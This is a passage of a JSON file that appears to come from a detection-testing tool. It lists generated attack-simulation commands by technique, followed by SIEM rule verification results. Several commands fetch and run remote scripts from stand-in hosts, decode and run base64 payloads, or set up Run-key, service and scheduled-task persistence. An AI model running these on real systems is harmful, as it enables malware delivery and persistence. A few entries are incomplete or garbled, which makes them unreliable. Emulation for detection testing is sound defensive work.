      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "openssl smime -sign -in file.txt -out signed_file.txt -signer cert.pem -inkey key.pem",
      "description": "Sign a file using the generated SSL certificate",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The file is signed using the SSL certificate and saved to a new file",
      "source": "langchain",
      "generated_at": "2025-12-28T14:06:56.435954",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "389fd3dd-aa14-4497-a532-90c0e4dc9aad",
      "ttp_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "echo 'This is a benign test file simulating a phishing payload.' > \"%TEMP%\\invoice.txt\" && notepad \"%TEMP%\\invoice.txt\"",
      "description": "Simulates opening a text file attachment from a phishing email that appears harmless.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a text file in the user's temp directory and opens it with Notepad to simulate user interaction with a phishing attachment.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:53:24.315980",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "6458f6f9-ae52-48c0-871b-f281f6d03aaa",
      "ttp_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "certutil.exe -decode \"%TEMP%\\encoded_payload.txt\" \"%TEMP%\\decoded_payload.bat\" >nul 2>&1 && cmd.exe /c \"%TEMP%\\decoded_payload.bat\"",
      "description": "Simulates decoding and executing a Base64-encoded script from a phishing attachment using built-in Windows tools.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a previously dropped Base64 file into a batch script and executes it. The batch script content is benign if pre-staged safely in encoded form.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:53:24.315980",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "ab2ef88b-1428-4bab-91d9-1ea3aa4b88a7",
      "ttp_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \" $cmd = 'echo Running simulated phishing payload...'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd); $encoded = [Convert]::ToBase64String($bytes); Start-Process powershell.exe -ArgumentList '-EncodedCommand', $encoded \"",
      "description": "Simulates execution of an encoded PowerShell command, a common technique in phishing payloads to obfuscate intent.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Generates a Base64-encoded Unicode string of a benign command and executes it via PowerShell to simulate obfuscated execution from a phishing email.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:53:24.316707",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "bbffb415-5855-459a-aed4-33f82fb02c74",
      "ttp_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "wget -qO- http://malicious.site/payload.sh | bash",
      "description": "Download and execute a shell script from a remote server, simulating a phishing payload delivery via malicious link.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a script from a remote URL and immediately executes it in the current shell. The script content is benign in testing (e.g., echo 'test'), but in real attacks could be malicious.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.882634",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "644419a2-dcd1-4307-9e7e-bdeef372728b",
      "ttp_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "curl -s http://malicious.site/script.sh | sh -c 'cat > $HOME/.cache/update.sh && chmod +x $HOME/.cache/update.sh && $HOME/.cache/update.sh'",
      "description": "Fetch a script via curl, save it locally with obfuscation, make it executable, and run it \u2014 simulating a multi-stage phishing attack.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a script, saves it in a hidden user directory, sets execute permissions, and runs it. Mimics stealthy persistence via phishing.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.883139",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "c84a2d0a-8ce7-47cc-94e6-f6b5e65fb891",
      "ttp_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_id": "2860623f-3c1e-444d-bb20-488aa259db63",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "echo 'IyEvYmluL2Jhc2ggDQpFY2hvICdlWE56YldWdFpYUXRZMjl1WkdselpYUT0n' | base64 -d | bash",
      "description": "Execute a base64-encoded bash script inline, simulating execution of an obfuscated payload from a phishing email or document.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes and executes a simple bash script (echo 'test') from base64. Represents how encoded payloads can be delivered and run without writing to disk.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.883139",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "7c806afe-5f68-4215-8eee-55608a8f8947",
      "ttp_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "schtasks.exe /create /tn \"Updater\" /tr \"cmd.exe /c echo Running as scheduled task > \"%TEMP%\\updater.log\"\" /sc minute /f",
      "description": "Creates a scheduled task that runs every minute using schtasks.exe",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A scheduled task named 'Updater' is created and will execute cmd.exe every minute, writing a timestamped log entry to %TEMP%\\updater.log. The task runs with user privileges.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.765445",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "e7e71184-5468-4a67-8811-46b82c409aa0",
      "ttp_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "sc.exe create \"FakeDriver\" binPath= \"%COMSPEC% /c echo Simulating service > \"%TEMP%\\fakedriver.log\"\" start= auto",
      "description": "Creates a Windows service using sc.exe that starts automatically",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A service named 'FakeDriver' is created and configured to start automatically at boot. It runs cmd.exe to write a log file to %TEMP%\\fakedriver.log. Requires administrator privileges to execute successfully.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.765445",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "7ea3151e-9152-47d2-8496-bfbf056b4a99",
      "ttp_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UserInit\" /t REG_SZ /d \"cmd.exe /c echo I am persistent > \\\"%TEMP%\\userinit.log\\\"\" /f",
      "description": "Adds a registry entry for user-level persistence using reg.exe",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A registry value 'UserInit' is added to HKCU Run key, causing the command to execute each time the user logs in. It writes a message to %TEMP%\\userinit.log. No elevated privileges required.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.765445",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "8f52d72f-06c6-43e1-9e30-6d9621cb09e6",
      "ttp_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "sudo systemctl start mytestservice",
      "description": "Start a new system service",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "The system service 'mytestservice' will be started.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:17.941164",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "1c176c61-7c52-4f32-b5e3-cb436ca34577",
      "ttp_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "sudo crontab -e",
      "description": "Modify the cron table to schedule a task at startup",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The cron table will be opened for editing, allowing the user to schedule a task to run at startup.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:17.941164",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "5a0c8db5-a7de-4ad2-af4e-ba674f99123e",
      "ttp_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "sudo systemctl enable mytestservice",
      "description": "Enable a system service to start at boot",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "The system service 'mytestservice' will be enabled to start at boot.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:17.941164",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "114167f4-ca29-4a8a-80d9-6826a990f9c1",
      "ttp_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_name": "Network Service Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "net view \\\\localhost",
      "description": "Basic network service discovery using legacy 'net view' to list shared resources on the local machine.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists shared resources on the local system using Windows legacy net command. Fails silently if no shares exist.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:18.138244",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "bd1d4552-1315-49cd-964e-17c7ba773137",
      "ttp_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_name": "Network Service Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "nslookup -type=srv _ldap._tcp",
      "description": "Intermediate discovery using DNS SRV record lookup to identify LDAP directory services on the domain.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Queries DNS for LDAP service records to discover domain controllers. Output shows hostname and port of available services.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:18.138244",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "c610a221-0489-4d75-b805-050d0ca1ac9e",
      "ttp_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_name": "Network Service Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"try { $tempFile = '$env:TEMP\\srv_discovery.txt'; 1..100 | ForEach-Object { $port = $_; $socket = New-Object System.Net.Sockets.TcpClient; $connect = $socket.BeginConnect('127.0.0.1', $port, $null, $null); $wait = $connect.AsyncWaitHandle.WaitOne(100, $false); if ($wait) { Add-Content -Path $tempFile -Value \"Open port: $port\" }; $socket.EndConnect($connect) } } catch { } finally { if (Test-Path $tempFile) { Get-Content $tempFile; Remove-Item $tempFile -ErrorAction SilentlyContinue } }\"",
      "description": "Advanced network service discovery via PowerShell TCP port scanning of common service ports on localhost with output to temp file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Scans ports 1-100 on localhost, logs open ports to a temporary file, outputs results, and cleans up the file. Uses safe error handling and built-in .NET classes via Cmdlets (not direct .NET reflection).",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:18.138244",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "5d4aae45-3075-4bac-9e23-b7cfdbaddbe2",
      "ttp_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_name": "Network Service Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "nmap -sT 192.168.1.1-100",
      "description": "Perform a TCP connect scan on the IP range 192.168.1.1-100 to identify open ports and services.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The command will scan the specified IP range and list the open ports and services, providing information about the network services available.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:07:54.738755",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "20100341-878d-470a-99e9-585017a14c68",
      "ttp_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_name": "Network Service Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "netstat -tlnp",
      "description": "List all active network connections, routing tables, and interface statistics to identify open ports and services.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "The command will display a list of all active network connections, including the protocol, local and foreign addresses, and the state of the connection.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:07:54.738755",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "d4cabbb0-1b41-4604-8bd3-aa165d46b8b5",
      "ttp_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
      "technique_name": "Network Service Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ss -tlnp",
      "description": "Use the 'ss' command to list all active network connections, similar to 'netstat', providing information about open ports and services.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "The command will display a list of all active network connections, including the protocol, local and foreign addresses, and the state of the connection, similar to 'netstat'.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:07:54.738755",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "58704d4c-9c19-4cc6-97e5-44635224dcd4",
      "ttp_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "echo test_data > %TEMP%\\collection.tmp && makecab %TEMP%\\collection.tmp %TEMP%\\archive.cab",
      "description": "Uses built-in makecab.exe to create a cabinet archive of collected data",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a temporary file and archives it into archive.cab using makecab.exe in the %TEMP% directory",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:41.811577",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "80867755-b286-456a-a877-0392d59dfdb0",
      "ttp_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "echo sensitive_logs > %TEMP%\\data.log && compact /C /I /Q %TEMP%\\data.log",
      "description": "Uses built-in compact.exe to compress a data file, simulating archival of collected data",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a log file and applies NTFS compression using compact.exe to simulate data archiving",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:41.811577",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "6252f73a-5087-4074-811a-ace64f032d11",
      "ttp_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path '$env:TEMP\\exfil_data.txt' -Value 'mock data' -ErrorAction SilentlyContinue; Compress-Archive -Path '$env:TEMP\\exfil_data.txt' -DestinationPath '$env:TEMP\\payload.zip' -Force -ErrorAction SilentlyContinue; Remove-Item '$env:TEMP\\exfil_data.txt' -ErrorAction SilentlyContinue\"",
      "description": "Uses PowerShell to create and zip a file with proper error handling and cleanup",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a test data file, compresses it into payload.zip using Compress-Archive, then removes the original file",
      "source": "langchain",
      "generated_at": "2025-12-28T13:58:41.811577",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "4e90879a-481b-4b1c-b1d7-a01cef606182",
      "ttp_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "tar -czf collected_data.tar.gz /path/to/sensitive/data",
      "description": "Basic example of archiving collected data using tar.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a compressed archive of the specified directory.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:17.943696",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "32bd365f-8ec3-4232-8b14-4a12c10b6420",
      "ttp_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "zip -r collected_data.zip /path/to/sensitive/data",
      "description": "Intermediate example using zip for archiving.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a compressed zip archive of the specified directory.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:17.943696",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "567d1913-ac6e-40e9-b9ca-c54ae76c973f",
      "ttp_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_id": "739f324f-581a-4ba0-861a-22e026e217ab",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "7z a -t7z -m0=lzma2 -mx=9 collected_data.7z /path/to/sensitive/data",
      "description": "Advanced example using 7z for highly compressed archiving.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a highly compressed 7z archive of the specified directory.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:03:17.944204",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "8af70d2e-2568-43f9-a442-36b0b2adc64c",
      "ttp_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://example.com/malware.exe %TEMP%\\update.exe && \"%TEMP%\\update.exe\"",
      "description": "Download and execute a file using certutil.exe, a built-in Windows binary often abused for file download.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a URL to the temp directory and executes it. In testing, the URL points to a benign or non-existent file. Execution occurs in user context.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:53:24.288670",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "52d926b9-997f-4e47-82e5-f0383148b997",
      "ttp_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\AppUpdate' -ErrorAction SilentlyContinue; $content = 'calc.exe'; Set-Content -Path '%TEMP%\\AppUpdate\\patch.js' -Value $content -Force; Invoke-Item '%TEMP%\\AppUpdate\\patch.js'\"",
      "description": "Create a malicious script file (e.g., .js) and execute it via user double-click simulation using Invoke-Item.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a directory in temp, writes a benign script that launches calc.exe, and 'opens' it as a user would. Simulates execution of a malicious script file through file association.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:53:24.288670",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "de7eaba1-865f-4290-8306-169891da047e",
      "ttp_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"$b64 = 'IQBvAGcAaQBuACAAewAgACgAZwBlAHQALQBpAHQAZQBtACAAYwBhAGwAYwAuAGUAeABlACkALgBsAGUAbgBnAHQAaAAgfAAgAHMAZQB0AC0AaQB0AGUAbQAgAC0AcABhAHQAaAAgACcALwBwAGEAdABoACcAfQA='; $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64)); Start-Process cmd -ArgumentList '/c calc.exe'\"",
      "description": "Simulate execution of an encoded command that decodes and runs a payload, mimicking obfuscated malicious scripts.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a Base64 string (UTF-16LE encoded) representing a benign command and executes calc.exe via cmd. Represents advanced obfuscation used in user execution attacks.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:53:24.289178",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "0fad981a-c373-4b4a-9c61-89caddaca90e",
      "ttp_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo 'echo \"Simulated malicious activity\"' > $TMP/malicious.sh && chmod +x $TMP/malicious.sh && $TMP/malicious.sh",
      "description": "Basic simulation: creates a shell script in temp directory, makes it executable, and runs it.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a simple shell script that prints a benign message, sets execute permissions, and runs it.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.764437",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "80e18b76-1b4e-4034-aa2c-802aa46cf7a3",
      "ttp_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "linux",
      "command": "printf '#!/bin/sh\\necho \"Payload executed\"; id' > /tmp/.hidden_payload.sh && chmod 700 /tmp/.hidden_payload.sh && sh /tmp/.hidden_payload.sh",
      "description": "Intermediate simulation: creates a hidden script with stealthy naming, sets restrictive permissions, and executes via sh.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Generates a hidden shell script in /tmp, makes it executable only to owner, and runs it using sh, simulating\u9690\u853d execution.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.764437",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.621,
      "validated": true
    },
    {
      "id": "36a59417-bc48-46cb-b63f-42d97ab24331",
      "ttp_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
      "technique_name": "User Execution: Malicious File",
      "tactic": "Execution",
      "platform": "linux",
      "command": "cat << 'EOF' > $TMP/update_check && chmod +x $TMP/update_check && exec $TMP/update_check",
      "description": "Advanced simulation: uses here-document to write a script inline, mimicking polymorphic or fileless-like behavior, then executes it immediately.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Writes a script directly from stdin (can be extended with logic), makes it executable, and replaces current shell process with it using exec.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:54:37.764437",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.621,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "170cac91-32eb-4e69-bda6-29a94a08c866",
      "ttp_id": "T1584",
      "detected": true,
      "events_found": 93,
      "query_time_ms": 922.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "e530a40f-26bc-4be5-b1a7-8db21996551a",
      "ttp_id": "T1071",
      "detected": true,
      "events_found": 29,
      "query_time_ms": 407.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "f8373f0e-b412-4b2f-895f-cfba216c3234",
      "ttp_id": "T1041",
      "detected": true,
      "events_found": 77,
      "query_time_ms": 619.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "43056f4c-b5d4-49f5-9107-90a26d0c45b5",
      "ttp_id": "T1090",
      "detected": true,
      "events_found": 131,
      "query_time_ms": 1741.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "d6218c22-cb1f-4827-a18e-fc48cec3487e",
      "ttp_id": "T1090.003",
      "detected": true,
      "events_found": 111,
      "query_time_ms": 1357.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "b8b5d69d-d424-4d64-b51b-f1f6a763f8df",
      "ttp_id": "T1018",
      "detected": true,
      "events_found": 118,
      "query_time_ms": 1099.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "046b4928-2768-45a3-ab80-dc36310452a3",
      "ttp_id": "T1190",
      "detected": true,
      "events_found": 118,
      "query_time_ms": 1537.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "67aece58-7413-4864-b02d-c9ce39c9c1f9",
      "ttp_id": "T1595",
      "detected": true,
      "events_found": 1433,
      "query_time_ms": 1170.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "5096f966-2734-4b8d-a9be-913390701325",
      "ttp_id": "T1204",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 831.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "4fd06d54-1169-4b6a-a32b-e0857e763411",
      "ttp_id": "T1078",
      "detected": true,
      "events_found": 2,
      "query_time_ms": 731.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a90ee93c-c08b-491d-8b26-a761e74d552a",
      "ttp_id": "T1550",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 1126.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "bfd6a6a5-1383-4819-ac6c-2c44a3015539",
      "ttp_id": "T1027",
      "detected": true,
      "events_found": 70,
      "query_time_ms": 516.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "8dd84482-331e-4291-9333-20cdd1957183",
      "ttp_id": "T1566",
      "detected": true,
      "events_found": 168,
      "query_time_ms": 508.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "8cde13db-c694-4c99-b67d-43b5a1ca67ab",
      "ttp_id": "T1543",
      "detected": true,
      "events_found": 100,
      "query_time_ms": 1175.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "812f063a-ff81-4f6c-86b6-1277aa57ca36",
      "ttp_id": "T1046",
      "detected": true,
      "events_found": 90,
      "query_time_ms": 485.0,
      "status": "success",
